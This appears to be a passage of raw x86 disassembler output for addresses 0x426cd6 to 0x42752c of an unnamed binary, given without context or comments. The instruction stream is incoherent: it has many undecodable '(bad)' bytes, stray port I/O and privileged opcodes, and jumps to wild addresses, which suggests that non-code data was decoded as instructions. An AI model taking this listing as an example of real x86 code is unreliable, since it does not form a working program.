  426cd6:	icebp  
  426cd7:	fidiv  DWORD PTR [eax-0x2241101a]
  426cdd:	jmp    0xd31a4ac1
  426ce2:	hlt    
  426ce3:	add    ebx,esp
  426ce5:	mov    ebp,0xc6f106c2
  426cea:	push   cs
  426ceb:	or     eax,0xf803f9e6
  426cf0:	fdivrp st(0),st
  426cf2:	lods   eax,DWORD PTR ds:[esi]
  426cf3:	enter  0xc3e3,0xc0
  426cf7:	in     al,0xb7
  426cf9:	mov    dh,0xe7
  426cfb:	mov    esi,0xbfb9d7fd
  426d00:	int    0xdc
  426d02:	add    eax,DWORD PTR [esi]
  426d04:	fcmovb st,st(7)
  426d06:	loopne 0x426d0b
  426d08:	or     bh,al
  426d0a:	hlt    
  426d0b:	iret   
  426d0c:	psubusw mm1,QWORD PTR [esi]
  426d0f:	add    BYTE PTR [ecx-0x4f3b2248],bh
  426d15:	int3   
  426d16:	leave  
  426d17:	(bad)  
  426d19:	in     eax,dx
  426d1a:	mov    ah,0xd8
  426d1c:	in     eax,0xfb
  426d1e:	fmul   st,st(0)
  426d20:	rcr    edi,1
  426d22:	cmc    
  426d23:	add    eax,0xfff7e6e2
  426d28:	ror    DWORD PTR [ecx],1
  426d2a:	sti    
  426d2b:	jmp    0xc8be:0xe107e4e0
  426d32:	xlat   BYTE PTR ds:[ebx]
  426d33:	ret    
  426d34:	(bad)  
  426d35:	lods   al,BYTE PTR ds:[esi]
  426d36:	shl    ecx,1
  426d38:	fprem1 
  426d3a:	into   
  426d3b:	int3   
  426d3c:	repz aam 0xd3
  426d3f:	add    edi,DWORD PTR [ecx-0x2b3df90c]
  426d45:	add    ah,bh
  426d47:	fdivr  st(4),st
  426d49:	or     ah,ah
  426d4b:	jmp    0xfb28772b
  426d50:	int3   
  426d51:	mov    al,0xdf
  426d53:	into   
  426d54:	icebp  
  426d55:	loopne 0x426d19
  426d57:	out    dx,al
  426d58:	fprem  
  426d5a:	clc    
  426d5b:	aam    0xf8
  426d5d:	sti    
  426d5e:	rcr    al,1
  426d60:	fdivp  st(0),st
  426d62:	into   
  426d63:	fscale 
  426d65:	cld    
  426d66:	jmp    0xf5d5:0xd6f7e6d9
  426d6d:	in     eax,dx
  426d6e:	or     al,0x4
  426d70:	in     al,0xbc
  426d72:	int3   
  426d73:	in     al,dx
  426d74:	in     al,0xc9
  426d76:	loop   0x426d32
  426d78:	out    0xb9,al
  426d7a:	(bad)  
  426d7b:	(bad)  
  426d7c:	std    
  426d7d:	aam    0xe3
  426d7f:	call   0xcd225e65
  426d84:	fcmovnbe st,st(3)
  426d86:	mov    ebp,0x9d4c6e0
  426d8b:	out    0xe9,al
  426d8d:	sti    
  426d8e:	adc    ah,cl
  426d90:	shr    BYTE PTR [edi-0x4c0d2e35],1
  426d96:	int3   
  426d97:	icebp  
  426d98:	mov    dh,0xc7
  426d9a:	mov    ebx,0xf8deccef
  426d9f:	fdiv   st,st(4)
  426da1:	int3   
  426da2:	ror    esi,cl
  426da4:	add    bh,bl
  426da6:	rol    BYTE PTR [ecx],1
  426da8:	fimul  WORD PTR [ecx]
  426daa:	rol    ch,0x1
  426dad:	or     eax,DWORD PTR [edx]
  426daf:	rol    cl,0xb2
  426db2:	xlat   BYTE PTR ds:[ebx]
  426db3:	int3   
  426db4:	lods   al,BYTE PTR ds:[esi]
  426db5:	loopne 0x426d6a
  426db7:	mov    edx,0xc6b7b4c1
  426dbc:	in     al,0xf5
  426dbe:	int    0xfa
  426dc0:	(bad)  
  426dc1:	sar    DWORD PTR [ebx+edx*8+0x4f40100],1
  426dc8:	cld    
  426dc9:	add    edx,ebp
  426dcb:	aad    0xf
  426dcd:	or     eax,0xf7ce13de
  426dd2:	test   eax,0xe3b6b6e2
  426dd7:	idiv   DWORD PTR [ebx-0x74f4831]
  426ddd:	mov    esi,0xf9bcddfb
  426de2:	(bad)  
  426de3:	fistp  QWORD PTR [esi-0x1808220e]
  426de9:	ror    edi,0xcf
  426dec:	in     eax,dx
  426ded:	wbinvd 
  426def:	fucomp st(7)
  426df1:	fsub   DWORD PTR [ebp-0x351c3813]
  426df7:	jmp    0xcbea:0xace5d2e4
  426dfe:	not    ch
  426e00:	repnz int3 
  426e02:	into   
  426e03:	ret    0xd6d5
  426e06:	pop    es
  426e07:	add    DWORD PTR [ecx],eax
  426e09:	std    
  426e0a:	fst    st(6)
  426e0c:	push   cs
  426e0d:	or     ch,cl
  426e0f:	repz lock mov esi,0xf6e3b1bd
  426e16:	loop   0x426dd8
  426e18:	retf   0xf0c4
  426e1b:	sar    DWORD PTR [eax+0x1b9f1ec],cl
  426e21:	into   
  426e22:	clc    
  426e23:	out    0xd6,al
  426e25:	loop   0x426df7
  426e27:	add    DWORD PTR [edi],eax
  426e29:	or     ecx,DWORD PTR [ebx]
  426e2b:	fucomip st,st(6)
  426e2d:	add    dh,ah
  426e2f:	fadd   st(7),st
  426e31:	jmp    0xb3b5:0xecc6e6c9
  426e38:	clc    
  426e39:	(bad)  
  426e3a:	fmul   st,st(2)
  426e3c:	repnz out dx,al
  426e3e:	fmulp  st(0),st
  426e40:	aam    0xd6
  426e42:	fcmovnb st,st(6)
  426e44:	rol    DWORD PTR [ecx],cl
  426e46:	add    eax,0xe1e508f2
  426e4b:	inc    DWORD PTR [ebx]
  426e4d:	or     al,0x4
  426e4f:	out    0xd0,al
  426e51:	stos   BYTE PTR es:[edi],al
  426e52:	imul   al
  426e54:	mov    dl,0xd3
  426e56:	(bad)  
  426e57:	loopne 0x426e48
  426e59:	mov    ah,0xec
  426e5b:	(bad)  
  426e5c:	mov    bh,0xf6
  426e5e:	mov    ch,0xf4
  426e60:	add    esp,ecx
  426e62:	rcr    ah,1
  426e64:	std    
  426e65:	icebp  
  426e66:	loop   0x426e2e
  426e68:	in     eax,0x9
  426e6a:	out    dx,al
  426e6b:	iret   
  426e6c:	in     eax,dx
  426e6d:	(bad)
  426e70:	shl    bl,cl
  426e72:	loop   0x426e5b
  426e74:	ret    0xdad7
  426e77:	mov    ebx,0xd2ebd8d3
  426e7c:	(bad)  
  426e7d:	out    dx,al
  426e7e:	xlat   BYTE PTR ds:[ebx]
  426e7f:	mov    eax,0xf2decddc
  426e84:	(bad)  
  426e85:	shl    ch,1
  426e87:	push   es
  426e88:	loopne 0x426e83
  426e8a:	loope  0x426e81
  426e8c:	in     eax,dx
  426e8d:	sti    
  426e8e:	or     eax,0xc3c4cb09
  426e93:	(bad)
  426e96:	sti    
  426e97:	repnz sti 
  426e99:	mov    al,0xcb
  426e9b:	push   DWORD PTR [ebx-0x48130c04]
  426ea1:	out    dx,al
  426ea2:	faddp  st(0),st
  426ea4:	out    0xe3,al
  426ea6:	std    
  426ea7:	loop   0x426e6a
  426ea9:	in     eax,0x4
  426eab:	cli    
  426eac:	loopne 0x426e96
  426eae:	ror    edx,cl
  426eb0:	lock in eax,0xce
  426eb3:	mov    esp,0xc1b6d7ea
  426eb8:	(bad)
  426ebb:	fdiv   st,st(7)
  426ebd:	mov    edi,0xd6f8f8bf
  426ec2:	mov    eax,0xe2fbf9e7
  426ec7:	rol    DWORD PTR [esi],1
  426ec9:	add    bl,al
  426ecb:	cmc    
  426ecc:	(bad)  
  426ece:	or     dh,bl
  426ed0:	in     al,dx
  426ed1:	loop   0x426e97
  426ed3:	call   0xda3135ce
  426ed8:	cmc    
  426ed9:	mov    edx,0xb4f6fdb1
  426ede:	fidivr DWORD PTR [ebp-0x2dfc3011]
  426ee4:	neg    cl
  426ee6:	(bad)  
  426ee7:	cmc    
  426ee8:	(bad)  
  426eea:	clc    
  426eeb:	aam    0xdc
  426eed:	enter  0xdfe0,0xd8
  426ef1:	test   al,0xe3
  426ef3:	in     eax,dx
  426ef4:	shl    DWORD PTR [edx-0x29484d33],1
  426efa:	cli    
  426efb:	frndint 
  426efd:	rcr    esi,1
  426eff:	rcr    ebp,1
  426f01:	mov    eax,0xd4faf2bc
  426f06:	hlt    
  426f07:	or     bl,ch
  426f09:	jmp    0xe0434d16
  426f0e:	les    ecx,FWORD PTR [eax]
  426f10:	call   0xb00020c8
  426f15:	repnz (bad) 
  426f17:	(bad)  
  426f19:	out    0xf4,al
  426f1b:	lods   al,BYTE PTR ds:[esi]
  426f1c:	repnz iret 
  426f1e:	sti    
  426f1f:	icebp  
  426f20:	jmp    0xc0094aed
  426f25:	(bad)  
  426f27:	aam    0xd8
  426f29:	lock clc 
  426f2b:	hlt    
  426f2c:	retf   0xc8dd
  426f2f:	push   es
  426f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f31:	shl    ebp,0xe6
  426f34:	mov    ebp,0xfae9fbb0
  426f39:	sti    
  426f3a:	sar    BYTE PTR [ebx-0x32344d05],1
  426f40:	jecxz  0x426f39
  426f42:	into   
  426f43:	mov    esi,0xfbd0fffb
  426f48:	or     al,bl
  426f4a:	fadd   DWORD PTR [edi]
  426f4c:	(bad)  
  426f4d:	out    dx,al
  426f4e:	add    ah,dl
  426f50:	rcl    bl,0xe7
  426f53:	repz jmp 0xc4f73a35
  426f59:	icebp  
  426f5a:	mov    edi,0xbfdcf7cd
  426f5f:	in     al,dx
  426f60:	(bad)  
  426f62:	mov    eax,0xe60407f1
  426f67:	aad    0xd4
  426f69:	retf   0xcacf
  426f6c:	out    0xa,al
  426f6e:	clc    
  426f6f:	fldl2e 
  426f71:	mov    eax,0xedbcbec1
  426f76:	out    dx,al
  426f77:	xabort 0xf1
  426f7a:	(bad)  
  426f7b:	mov    al,0xdd
  426f7d:	fnstcw WORD PTR [esi-0x191f1625]
  426f83:	clc    
  426f84:	mov    ebp,0xdee7d3df
  426f89:	in     al,0xdc
  426f8b:	out    0xfd,eax
  426f8d:	in     al,0xe0
  426f8f:	shr    DWORD PTR [ebp-0x2a341b35],cl
  426f95:	mov    cl,0xb5
  426f97:	in     eax,0xea
  426f99:	fnstenv [ecx-0x9164542]
  426f9f:	out    dx,eax
  426fa0:	fdivrp st(4),st
  426fa2:	stc    
  426fa3:	add    ah,bh
  426fa5:	icebp  
  426fa6:	add    BYTE PTR [ecx],cl
  426fa8:	fld    st(7)
  426faa:	(bad)  
  426fac:	aam    0xb
  426fae:	fmulp  st(0),st
  426fb0:	mov    eax,0xe8d6d6b0
  426fb5:	mov    bl,0xd0
  426fb7:	loope  0x426f70
  426fb9:	(bad)  
  426fba:	in     eax,dx
  426fbb:	in     al,0xef
  426fbd:	leave  
  426fbe:	iret   
  426fbf:	(bad)  
  426fc1:	std    
  426fc2:	loope  0x426fbf
  426fc4:	out    0xf0,eax
  426fc6:	ret    0xf4fc
  426fc9:	imul   dh
  426fcb:	push   cs
  426fcc:	fld    QWORD PTR [esi]
  426fce:	push   cs
  426fcf:	add    eax,0xd3f6afbe
  426fd4:	aam    0xb1
  426fd6:	(bad)  
  426fd7:	test   al,0xd4
  426fd9:	rcl    ah,cl
  426fdb:	clc    
  426fdc:	sti    
  426fdd:	stc    
  426fde:	enter  0xfcc2,0xc3
  426fe2:	ret    
  426fe3:	ror    ebp,1
  426fe5:	or     ebx,esi
  426fe7:	stc    
  426fe8:	clc    
  426fe9:	stc    
  426fea:	stc    
  426feb:	jmp    0x426fc8
  426fed:	retf   0xdfe3
  426ff0:	repnz ror ah,0xbe
  426ff4:	ror    edi,0xea
  426ff7:	call   0xeb134feb
  426ffc:	std    
  426ffd:	leave  
  426ffe:	int3   
  426fff:	aam    0xf9
  427001:	sar    ecx,cl
  427003:	sti    
  427004:	fcomi  st,st(1)
  427006:	cmc    
  427007:	fcom   st(7)
  427009:	or     DWORD PTR [esi],ecx
  42700b:	out    dx,al
  42700c:	in     al,dx
  42700d:	enter  0xfe2,0xab
  427011:	jmp    0x426ff9
  427013:	fsubr  st(6),st
  427015:	out    dx,al
  427016:	cli    
  427017:	aam    0xdb
  427019:	(bad)
  42701c:	retf   
  42701d:	out    dx,eax
  42701e:	out    dx,al
  42701f:	cli    
  427020:	cli    
  427021:	cmc    
  427022:	not    esi
  427024:	cld    
  427025:	fsubrp st(3),st
  427027:	push   es
  427028:	jecxz  0x426fef
  42702a:	push   cs
  42702b:	fcomp  st(4)
  42702d:	fild   DWORD PTR ds:0xa8b8b1e5
  427033:	scas   eax,DWORD PTR es:[edi]
  427034:	in     al,0xb3
  427036:	jmp    0xb82e591c
  42703b:	fincstp 
  42703d:	mov    ebx,0xbdbfcdf4
  427042:	out    0xbd,eax
  427044:	lock out 0xc1,eax
  427047:	(bad)  
  427048:	or     ebp,esi
  42704a:	(bad)  
  42704b:	out    dx,al
  42704c:	jmp    0xd2f3:0xc5e804f8
  427053:	retf   0xedd5
  427056:	hlt    
  427057:	(bad)  
  427059:	mov    ebx,0xcdcceff6
  42705e:	retf   0xd6dc
  427061:	push   ebx
  427063:	mov    ebp,0x4d1ffd8
  427068:	push   es
  427069:	or     dl,bh
  42706b:	les    eax,FWORD PTR [edx]
  42706d:	out    0xb,eax
  42706f:	loop   0x42702e
  427071:	(bad)  
  427072:	les    esi,FWORD PTR [ecx-0xf290851]
  427078:	fcom   st(6)
  42707a:	icebp  
  42707b:	retf   
  42707c:	enter  0xefe9,0x1
  427080:	(bad)  
  427081:	repnz int3 
  427083:	rcr    ecx,1
  427085:	xlat   BYTE PTR ds:[ebx]
  427086:	std    
  427087:	(bad)
  42708a:	loopne 0x427069
  42708c:	in     eax,0xfa
  42708e:	in     eax,dx
  42708f:	or     eax,0xcfb7f2e3
  427094:	retf   0xe8c5
  427097:	ret    0xd9cd
  42709a:	retf   0xdbf0
  42709d:	stc    
  42709e:	fcomp  st(4)
  4270a0:	neg    ecx
  4270a2:	hlt    
  4270a3:	pop    es
  4270a4:	sti    
  4270a5:	fdivr  st(0),st
  4270a7:	fcmovb st,st(2)
  4270a9:	loope  0x4270ad
  4270ab:	in     eax,dx
  4270ac:	int    0xc8
  4270ae:	or     ebp,edi
  4270b0:	shr    DWORD PTR [edx-0xe482f38],1
  4270b6:	test   eax,0xbadbe5b3
  4270bb:	mov    ebx,0xcab9c8e9
  4270c0:	add    ecx,eax
  4270c2:	sar    BYTE PTR [ebp+eiz*8-0x1a2b2c0b],cl
  4270c9:	loop   0x4270a0
  4270cb:	fmul   QWORD PTR ds:0xe907e8d8
  4270d1:	mov    ebp,0xf2f7f3b7
  4270d6:	call   0xcf2e42b6
  4270db:	mov    al,0xdf
  4270dd:	sti    
  4270de:	stc    
  4270df:	(bad)  
  4270e0:	mov    eax,0xcdddcfba
  4270e5:	icebp  
  4270e6:	clc    
  4270e7:	(bad)  
  4270e8:	jmp    0xe3486ff0
  4270ed:	fldl2t 
  4270ef:	clc    
  4270f0:	ret    0xebdd
  4270f3:	mov    dh,0xcb
  4270f5:	icebp  
  4270f6:	(bad)  
  4270f7:	lock mov bl,0xe4
  4270fa:	out    0xe5,al
  4270fc:	enter  0xfeec,0xbc
  427100:	out    dx,eax
  427101:	lock clc 
  427103:	mov    esi,0xe4ffc4fa
  427108:	retf   
  427109:	lds    ecx,FWORD PTR [edi]
  42710b:	(bad)  
  42710d:	jmp    0x4270fd
  42710f:	int    0xbe
  427111:	in     al,0xd2
  427113:	test   ebx,0xf1c2f2f4
  427119:	mov    edx,0xf0fdd2d7
  42711e:	leave  
  42711f:	hlt    
  427120:	mov    bh,0xde
  427122:	out    0xfa,eax
  427124:	inc    al
  427126:	stc    
  427127:	add    ecx,edi
  427129:	fcom   st(7)
  42712b:	hlt    
  42712c:	(bad)  
  42712d:	or     eax,esp
  42712f:	loope  0x4270f7
  427131:	idiv   DWORD PTR [esi-0x52161410]
  427137:	aam    0xb3
  427139:	(bad)  
  42713a:	xlat   BYTE PTR ds:[ebx]
  42713b:	jmp    0x427105
  42713d:	in     eax,dx
  42713e:	jecxz  0x42712e
  427140:	aam    0xb9
  427142:	cld    
  427143:	pop    es
  427144:	mov    ebp,0xcb0407c4
  427149:	or     eax,DWORD PTR [edi+ecx*1]
  42714c:	push   cs
  42714d:	fld    DWORD PTR [esi]
  42714f:	push   cs
  427150:	fucomip st,st(2)
  427152:	int3   
  427153:	lods   al,BYTE PTR ds:[esi]
  427154:	mov    bl,0xcb
  427156:	(bad)
  427159:	stc    
  42715a:	cli    
  42715b:	mov    esi,0xfb03beda
  427160:	cli    
  427161:	into   
  427162:	sar    BYTE PTR [esi-0x43043ffd],0xbf
  427169:	jecxz  0x42712b
  42716b:	(bad)  
  42716d:	jmp    0xbeee:0xaccbc90f
  427174:	mov    al,0xec
  427176:	rol    cl,cl
  427178:	lock out dx,al
  42717a:	lods   eax,DWORD PTR ds:[esi]
  42717b:	out    dx,eax
  42717c:	into   
  42717d:	retf   0xfad2
  427180:	int3   
  427181:	std    
  427182:	clc    
  427183:	ret    0xf604
  427186:	retf   
  427187:	lock (bad) 
  427189:	fcmovnbe st,st(5)
  42718b:	cmc    
  42718c:	add    al,0xf3
  42718e:	clc    
  42718f:	push   es
  427190:	mov    dl,0xcc
  427192:	out    dx,al
  427193:	mov    ebp,0xd5b5dce3
  427198:	repnz rol dh,cl
  42719b:	jmp    0xda462b97
  4271a0:	clc    
  4271a1:	mov    edx,0xf0f6c1f1
  4271a6:	loopne 0x4271a5
  4271a8:	loop   0x4271af
  4271aa:	(bad)  
  4271ab:	sti    
  4271ac:	jmp    0x4271b0
  4271ae:	ffree  st(0)
  4271b0:	jmp    0xd70b509a
  4271b5:	in     eax,0xc4
  4271b7:	fcmovne st,st(3)
  4271b9:	vaddsubps ymm6,ymm0,ymm6
  4271bd:	jecxz  0x4271ae
  4271bf:	in     eax,dx
  4271c0:	mov    ecx,0xe0f006d7
  4271c5:	sti    
  4271c6:	(bad)  
  4271c7:	stc    
  4271c8:	out    0xe8,eax
  4271ca:	(bad)  
  4271cc:	dec    DWORD PTR [eax*8-0x2e2d1f18]
  4271d3:	(bad)  
  4271d4:	mov    bl,0xeb
  4271d6:	mov    bl,0xba
  4271d8:	shl    esp,0xff
  4271db:	retf   0xdfea
  4271de:	(bad)  
  4271e0:	aam    0xba
  4271e2:	fsubr  st(7),st
  4271e4:	cmc    
  4271e5:	clc    
  4271e6:	sti    
  4271e7:	aam    0xc2
  4271e9:	jecxz  0x4271e2
  4271eb:	enter  0xc501,0x8
  4271ef:	fdivrp st(2),st
  4271f1:	imul   eax
  4271f3:	in     al,dx
  4271f4:	mov    esp,0xd4c1f5cd
  4271f9:	xlat   BYTE PTR ds:[ebx]
  4271fa:	ror    bl,1
  4271fc:	jmp    0xf4cf:0xc9eac3fb
  427203:	sar    BYTE PTR [ecx+eax*8-0x1c180935],0xc5
  42720b:	(bad)  
  42720d:	iret   
  42720e:	jmp    0xd22e4424
  427213:	mov    cl,0xd0
  427215:	loop   0x4271ce
  427217:	stc    
  427218:	in     eax,dx
  427219:	mov    ch,0xcf
  42721b:	(bad)
  42721e:	div    ah
  427220:	(bad)  
  427222:	(bad)  
  427224:	not    eax
  427226:	(bad)  
  427227:	cld    
  427228:	aam    0xd7
  42722a:	add    edx,esp
  42722c:	or     ecx,edi
  42722e:	repnz shl cl,0xd1
  427232:	mov    bl,0xce
  427234:	iret   
  427235:	fcmovnbe st,st(1)
  427237:	mov    dh,0xeb
  427239:	out    0xad,al
  42723b:	idiv   edx
  42723d:	rol    DWORD PTR [edx],cl
  42723f:	int3   
  427240:	fild   DWORD PTR [edx]
  427242:	neg    cl
  427244:	rol    ecx,cl
  427246:	in     al,0xc1
  427248:	add    ah,dh
  42724a:	push   es
  42724b:	or     eax,0xfc06e600
  427250:	fsubr  DWORD PTR [ecx+eiz*8-0xa171c20]
  427257:	mov    al,0xe6
  427259:	fsubr  st,st(6)
  42725b:	clc    
  42725c:	retf   0xffd5
  42725f:	mov    ebp,0xfdf3d1f8
  427264:	rcr    ah,1
  427266:	or     al,BYTE PTR ds:0xe707f4da
  42726c:	jmp    0xd00f7677
  427271:	out    dx,eax
  427272:	mov    al,0xf3
  427274:	mov    bh,0xca
  427276:	in     eax,dx
  427277:	mov    al,0xc5
  427279:	not    esp
  42727b:	(bad)  
  42727c:	int3   
  42727d:	out    dx,al
  42727e:	fucomip st,st(4)
  427280:	mov    ebp,0x4f6f9cf
  427285:	(bad)  
  427286:	cli    
  427287:	inc    BYTE PTR [ecx]
  427289:	std    
  42728a:	add    bl,ch
  42728c:	(bad)  
  42728d:	sti    
  42728e:	fsubr  st(5),st
  427290:	stos   DWORD PTR es:[edi],eax
  427291:	scas   eax,DWORD PTR es:[edi]
  427292:	ret    
  427293:	scas   al,BYTE PTR es:[edi]
  427294:	rcl    ah,1
  427296:	loop   0x42724a
  427298:	call   0xff38246b
  42729d:	fstp   TBYTE PTR [esp+esi*4-0x3e1207fe]
  4272a4:	add    eax,DWORD PTR [ebx+eax*8]
  4272a7:	or     esp,edi
  4272a9:	shl    al,1
  4272ab:	push   es
  4272ac:	cld    
  4272ad:	loope  0x427273
  4272af:	in     eax,0xef
  4272b1:	enter  0xe8e2,0xc0
  4272b5:	sti    
  4272b6:	into   
  4272b7:	out    0xeb,eax
  4272b9:	mov    eax,0xe8e5f9f8
  4272be:	mov    ah,0xd9
  4272c0:	mov    bh,0x2
  4272c2:	loopne 0x42729b
  4272c4:	mul    cl
  4272c6:	add    ah,dh
  4272c8:	add    eax,ebx
  4272ca:	jmp    0x427293
  4272cc:	add    al,0xfc
  4272ce:	fneni(8087 only) 
  4272d0:	call   0xc2f06685
  4272d5:	fcmovnb st,st(3)
  4272d7:	mov    ah,0xfa
  4272d9:	aad    0xe8
  4272db:	les    edi,FWORD PTR [edx-0x480f362e]
  4272e1:	mov    ebp,0x6f4d5df
  4272e6:	icebp  
  4272e7:	repnz add ebp,edx
  4272ea:	call   0x8563ae4
  4272ef:	loop   0x4272af
  4272f1:	shr    cl,1
  4272f3:	loopne 0x4272d2
  4272f5:	out    0xe8,al
  4272f7:	loop   0x4272c1
  4272f9:	aam    0xfe
  4272fb:	in     al,dx
  4272fc:	out    dx,eax
  4272fd:	sti    
  4272fe:	mov    ebp,0x2e1fbca
  427303:	out    0xe0,eax
  427305:	add    al,0xde
  427307:	mov    esp,0xd90a03c3
  42730c:	retf   0xc4dc
  42730f:	icebp  
  427310:	mov    dl,0xa6
  427312:	jmp    0xe20d4ff9
  427317:	stc    
  427318:	repz rcr al,0xe9
  42731c:	rcl    esp,cl
  42731e:	icebp  
  42731f:	mov    ebx,0xd3de00c9
  427324:	add    eax,0xfef9e5ec
  427329:	or     bh,al
  42732b:	(bad)  
  42732d:	retf   
  42732e:	jmp    0x427329
  427330:	out    dx,eax
  427331:	ret    
  427332:	jecxz  0x427302
  427334:	mov    dl,0xac
  427336:	(bad)  
  427337:	jmp    0xdac8:0xb6e8ebf0
  42733e:	mov    ecx,0xfed300d9
  427343:	fsubr  st(7),st
  427345:	mov    esp,0xebeadcfe
  42734a:	push   es
  42734b:	add    dl,bh
  42734d:	pop    es
  42734e:	shl    edx,cl
  427350:	in     eax,dx
  427351:	out    dx,eax
  427352:	test   eax,0xc0b2f1d1
  427357:	stc    
  427358:	mov    edx,0xcdf8e7b0
  42735d:	std    
  42735e:	xlat   BYTE PTR ds:[ebx]
  42735f:	out    dx,al
  427360:	(bad)  
  427361:	call   0x5163569
  427366:	loop   0x42734e
  427368:	test   BYTE PTR [edx],0xc4
  42736b:	(bad)  
  42736c:	sti    
  42736d:	cld    
  42736e:	push   cs
  42736f:	shl    bl,cl
  427371:	jmp    0xb0d0:0xe1f5e8af
  427378:	shl    ebp,0xc6
  42737b:	mov    edx,0xd9f4bdd5
  427380:	rol    bl,1
  427382:	int    0xed
  427384:	mov    edi,0xddcbe0da
  427389:	or     bl,dl
  42738b:	(bad)  
  42738d:	hlt    
  42738e:	out    dx,al
  42738f:	jecxz  0x427380
  427391:	jmp    0xcef24956
  427396:	out    0xc5,al
  427398:	jmp    0xc5366066
  42739d:	shr    ebx,1
  42739f:	fucomp st(7)
  4273a1:	jecxz  0x427370
  4273a3:	loop   0x4273ab
  4273a5:	aam    0xe6
  4273a7:	std    
  4273a8:	inc    bh
  4273aa:	out    0x6,al
  4273ac:	cli    
  4273ad:	int3   
  4273ae:	loopne 0x4273c3
  4273b0:	fidivr WORD PTR [ebp-0x1b0b331c]
  4273b6:	jmp    0x42737e
  4273b8:	out    dx,eax
  4273b9:	into   
  4273ba:	sti    
  4273bb:	std    
  4273bc:	repnz mov esi,0xe8ffc9ca
  4273c2:	rcr    edi,1
  4273c4:	add    al,0xc5
  4273c6:	ret    
  4273c7:	(bad)  
  4273c8:	loopne 0x42738b
  4273ca:	(bad)  
  4273cb:	por    mm1,mm6
  4273ce:	retf   
  4273cf:	out    0xb3,al
  4273d1:	int    0xd2
  4273d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273d4:	enter  0xd7e8,0xee
  4273d8:	mov    ecx,0xfff5fadf
  4273dd:	(bad)  
  4273de:	rol    ebx,1
  4273e0:	repz faddp st(2),st
  4273e3:	rol    edi,1
  4273e5:	push   es
  4273e6:	icebp  
  4273e7:	retf   0x4dc
  4273ea:	(bad)  
  4273eb:	std    
  4273ec:	enter  0xddd,0x12
  4273f0:	lods   eax,DWORD PTR ds:[esi]
  4273f1:	test   eax,0xe1eabcf2
  4273f6:	hlt    
  4273f7:	(bad)  
  4273f8:	out    dx,eax
  4273f9:	(bad)  
  4273fa:	shl    DWORD PTR [ebp+ebp*8-0x3c250f],1
  427401:	mov    esp,0xf8cdf9ce
  427406:	(bad)  
  427407:	lock retf 
  427409:	mul    ecx
  42740b:	fimul  DWORD PTR [ecx]
  42740d:	clc    
  42740e:	loop   0x42740c
  427410:	repz rcl bl,1
  427413:	repnz cmc 
  427415:	(bad)  
  427416:	in     eax,dx
  427417:	not    edi
  427419:	in     al,dx
  42741a:	shl    cl,cl
  42741c:	repnz in eax,dx
  42741e:	fdivr  st(3),st
  427420:	idiv   DWORD PTR [edx-0x431d1211]
  427426:	fcmovu st,st(3)
  427428:	or     edi,edx
  42742a:	enter  0xf80e,0xe1
  42742e:	leave  
  42742f:	leave  
  427430:	repz loop 0x4273fa
  427433:	int    0xc4
  427435:	iret   
  427436:	out    0xd0,al
  427438:	in     eax,0xbb
  42743a:	aam    0xeb
  42743c:	shr    al,cl
  42743e:	jecxz  0x42743d
  427440:	(bad)  
  427441:	sti    
  427442:	loope  0x427430
  427444:	std    
  427445:	mov    esi,0xfbe5f6fe
  42744a:	mov    ebp,0xeacb0de3
  42744f:	in     al,dx
  427450:	mov    ecx,0xb5ebe3e6
  427455:	in     al,0xb7
  427457:	test   al,0xcb
  427459:	sar    DWORD PTR [edx-0x12b130f],1
  42745f:	fsubr  st(2),st
  427461:	mov    ecx,0xdb0707d5
  427466:	lock hlt 
  427468:	add    eax,eax
  42746a:	out    0x3,al
  42746c:	or     DWORD PTR [eax+ecx*1],ecx
  42746f:	fld    st(0)
  427471:	mov    cl,0xcd
  427473:	int    0xf6
  427475:	repz mov ch,0xc0
  427478:	icebp  
  427479:	cli    
  42747a:	lods   eax,DWORD PTR ds:[esi]
  42747b:	mov    edx,0xb8b4f7ce
  427480:	cli    
  427481:	(bad)  
  427482:	stc    
  427483:	rol    edx,1
  427485:	loopne 0x42745e
  427487:	aam    0xe9
  427489:	add    al,bh
  42748b:	out    dx,al
  42748c:	add    al,0xc9
  42748e:	push   cs
  42748f:	add    DWORD PTR [ecx+edx*8-0x1d0d1e58],ebp
  427496:	icebp  
  427497:	in     al,dx
  427498:	(bad)  
  427499:	out    dx,al
  42749a:	in     al,dx
  42749b:	(bad)  
  42749c:	(bad)  
  42749d:	in     al,dx
  42749e:	rol    DWORD PTR [edx],1
  4274a0:	leave  
  4274a1:	loop   0x427499
  4274a3:	out    0xda,eax
  4274a5:	repz aad 0xc0
  4274a8:	shl    esp,0x9
  4274ab:	(bad)  
  4274ac:	out    dx,eax
  4274ad:	cli    
  4274ae:	in     eax,0xef
  4274b0:	in     eax,0xbf
  4274b2:	out    dx,eax
  4274b3:	mul    ebx
  4274b5:	lods   eax,DWORD PTR ds:[esi]
  4274b6:	lods   eax,DWORD PTR ds:[esi]
  4274b7:	out    0xf1,al
  4274b9:	aad    0xe9
  4274bb:	aad    0xed
  4274bd:	in     eax,dx
  4274be:	jmp    0x4274b2
  4274c0:	leave  
  4274c1:	xlat   BYTE PTR ds:[ebx]
  4274c2:	fdivr  st,st(3)
  4274c4:	out    0xe5,eax
  4274c6:	mov    esp,0x5fe07df
  4274cb:	in     eax,dx
  4274cc:	vpmulhuw xmm1,xmm7,xmm1
  4274d1:	mov    cl,0xcb
  4274d3:	test   al,0xd7
  4274d5:	mov    esp,0xe8e7c9e1
  4274da:	stc    
  4274db:	aad    0xc5
  4274dd:	mov    ecx,0x3d0cafb
  4274e2:	shl    cl,cl
  4274e4:	int    0xfb
  4274e6:	add    ah,dh
  4274e8:	or     BYTE PTR [ecx],cl
  4274ea:	jmp    0xa9fe:0xe7d9fa07
  4274f1:	mov    ah,0xe8
  4274f4:	mov    bl,0xfb
  4274f6:	retf   
  4274f7:	in     al,0xe4
  4274f9:	out    0xb9,al
  4274fb:	aam    0xcd
  4274fd:	idiv   eax
  4274ff:	add    edi,DWORD PTR [edx-0x62a0431]
  427505:	fcos   
  427507:	ret    0xcafa
  42750a:	rol    ch,0xfd
  42750d:	pminub mm0,mm0
  427510:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427512:	retf   
  427513:	mov    bl,0xdd
  427515:	loopne 0x4274e9
  427517:	vpsubusw ymm0,ymm7,ymm7
  42751b:	ffreep st(5)
  42751d:	out    dx,al
  42751e:	in     eax,dx
  42751f:	mov    al,0xd8
  427521:	ret    0xe5ff
  427524:	(bad)  
  427525:	(bad)  
  427526:	sti    
  427527:	(bad)  
  427528:	mul    bh
  42752a:	in     eax,0xeb
  42752c:	call   0xae51641e
